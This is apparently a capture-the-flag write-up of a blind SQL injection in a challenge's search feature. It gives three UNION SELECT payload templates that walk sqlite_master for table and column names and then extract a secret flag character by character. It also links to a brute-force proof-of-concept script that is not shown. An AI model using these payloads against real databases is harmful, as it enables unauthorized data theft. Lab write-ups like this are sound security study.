# Challenge `Sometimes we are just temporarily blind` writeup

- **Vulnerability:** SQL injection
- **Where:** In search
- **Impact:** Allows execution of arbitrary query. Result set length enables validation of query result.

## Steps to reproduce

1. Extract information about query by looking at "Found x" result.
1. Use provided script (bruteforce binary injection, iterates through character options and validates query with previously mentioned method) to extract name of an unknown table (different from previous challenge).
   ```
   null' UNION Select name, tbl_name, sql from sqlite_master where substr(tbl_name,1,%d) = '%s' --
   ```
1. After having table name, do the same but for sql schema to get column names:

   ```
   %dnull' UNION Select name, tbl_name, sql from sqlite_master where tbl_name='super_s_sof_secrets' AND sql LIKE '%s%%' --

   ```

1. Now that we know the table and column names, we do the same to exfiltrate the flag from this table:

```
null' UNION Select id, null, secret from super_s_sof_secrets where substr(secret,1,%d) = '%s' --
```

[POC](sometimes_we_are_just_temporarily_blind.py)
